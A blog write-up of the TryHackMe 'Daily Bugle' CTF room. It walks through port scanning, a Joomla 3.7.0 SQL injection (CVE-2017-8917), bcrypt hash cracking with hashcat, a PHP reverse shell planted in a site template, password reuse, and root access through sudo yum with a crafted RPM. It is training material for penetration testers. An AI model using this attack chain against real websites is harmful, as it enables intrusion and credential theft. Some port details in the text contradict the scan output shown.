---
layout: post
current: post
cover: 'assets/images/dailybugle/cover.png'
navigation: True
title: "Daily Bugle Write Up"
date: 2021-03-21 00:00:00
tags: [tryhackme, ctf, hard, oscp]
class: post-template
subclass: 'post'
author: darryn
---
![cover](/assets/images/dailybugle/cover.png)

### Overview

[dailybugle](https://tryhackme.com/room/dailybugle) is a hard rated CTF room on [TryHackMe](https://tryhackme.com) and part of the 'Offensive Pentesting' path I'm currently working through. Although rated hard I think this is more of a medium level box. I really enjoyed the priv esc element of this machine as although the steps required to exploit can be found easily its not simply a case of copying and pasting the steps from GTFObins.

### Nmap

I deployed the machine and was given the target IP 10.10.152.1. I started a NMAP scan to check the available ports. 

```highlight
└─$ sudo nmap -sC -sV -oA nmap/initial 10.10.152.1
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-20 11:36 GMT
Nmap scan report for 10.10.152.1
Host is up (0.028s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
```

3 Ports open:

- 22 - SSH - Banner is showing its an Ubuntu machine
- 80 - HTTP - Apache web server version 2.4.18
- 3306 - MYSQL - Maria DB

I also ran a full port scan but no additional ports were found.

### Enumeration

I started with port 80 and looked at the webpage. It's obviously promoting #fakenews, Spider-Man would never rob a bank! The login form could be useful but I decide to keep looking around for now.

![homepage](/assets/images/dailybugle/homepage.png)

nmap found a robots.txt so I had a look through these, /administrator jumps out as being the most interesting.

```highlight
# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

/administrator brings me to a Joomla login page. I haven't got any creds yet so not much use. I tried some common credentials such as admin/admin and admin/password but they didn't work.

![admin](/assets/images/dailybugle/admin.png)

I ran ffuf to see if I could find any other directories but couldn't find anything.

```highlight
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.10.152.1/FUZZ -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.152.1/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

templates               [Status: 301, Size: 237, Words: 14, Lines: 8]
media                   [Status: 301, Size: 233, Words: 14, Lines: 8]
modules                 [Status: 301, Size: 235, Words: 14, Lines: 8]
bin                     [Status: 301, Size: 231, Words: 14, Lines: 8]
plugins                 [Status: 301, Size: 235, Words: 14, Lines: 8]
includes                [Status: 301, Size: 236, Words: 14, Lines: 8]
language                [Status: 301, Size: 236, Words: 14, Lines: 8]
components              [Status: 301, Size: 238, Words: 14, Lines: 8]
cache                   [Status: 301, Size: 233, Words: 14, Lines: 8]
images                  [Status: 301, Size: 234, Words: 14, Lines: 8]
libraries               [Status: 301, Size: 237, Words: 14, Lines: 8]
tmp                     [Status: 301, Size: 231, Words: 14, Lines: 8]
layouts                 [Status: 301, Size: 235, Words: 14, Lines: 8]
administrator           [Status: 301, Size: 241, Words: 14, Lines: 8]
cli                     [Status: 301, Size: 231, Words: 14, Lines: 8]
                        [Status: 200, Size: 9255, Words: 441, Lines: 243]
:: Progress: [220546/220546] :: Job [1/1] :: 1340 req/sec :: Duration: [0:02:42] :: Errors: 0 ::
```

I wanted to check for any Joomla exploits but I first needed to find the version, a quick Google shows me I can find the version by browsing to: http://10.10.152.1/administrator/manifests/files/joomla.xml

![version](/assets/images/dailybugle/version.png)

### Initial Access

The web server is running Joomla 3.7.0, this is vulnerable to [CVE-2017-8917](https://nvd.nist.gov/vuln/detail/CVE-2017-8917). There is a note on the TryHackMe task:

> *Instead of using SQLMap, why not use a python script!*

Using Google I found a [script](https://github.com/NinjaJc01/joomblah-3/blob/master/joomblah.py) on Github. However when I run it, it doesn't find any users and I get the following output.

```highlight
Found table: b'fb9j5_users'
Extracting users from b'fb9j5_users'
```

The b indicates bytes, from the Python3 documentation:

>Bytes literals are always prefixed with 'b' or 'B'; they produce an instance of the bytes type instead of the str type. They may only contain ASCII characters; bytes with a numeric value of 128 or greater must be expressed with escapes.

To fix the script I updated line 45 to the following:

value = binascii.unhexlify(value).decode("utf-8")

Now run I run the script I get a user account!

```highlight
Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '{HASH REDCATED}', '', '']
```

I put the hash in a file called 'hash' and use hashcat to crack the password. I selected mode 3200 because I compared the hash to the hashcat [examples](https://hashcat.net/wiki/doku.php?id=example_hashes) and it was in bcrypt format. The command I used was:

hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt

Once the password cracked I tried to log in to the machine using SSH but had no luck so I tried the Joomla Administrator portal and got in.

![loggedin](/assets/images/dailybugle/loggedin.png)

With CMS platforms I've seen techniques in the past of uploading reverse shell code to the template used to generate a shell, so I tried that first. Going to Extensions - Templates Menu, I added the pentestmonkey php [reverseshell](https://github.com/pentestmonkey/php-reverse-shell) code to the prostar template and updated with my Kali machines IP and port. I saved the template and opened the main index page.

I got a shell as 'apache'. Looking at the /var/www/html directory I found configuration.php, in here its a username and password.

```highlight
public $user = 'root';        public $password = 'REDCATED';
```

Checking /etc/passwd I can see a user jjameson, I try that username with the password found in the configuration.php file and get SSH access.

### Priv Esc

Checking sudo -l, jjameson can run yum commands as sudo. [GTFObins](https://gtfobins.github.io) indicates I can use yum to escalate privilages to root however first I need a .rpm file. I followed the steps in this article by [klockw3rk](https://medium.com/@klockw3rk/privilege-escalation-how-to-build-rpm-payloads-in-kali-linux-3a61ef61e8b2) and got root!

```highlight
[root@dailybugle ~]# id;hostname
id;hostname
uid=0(root) gid=0(root) groups=0(root)
dailybugle
```

Thanks for reading!

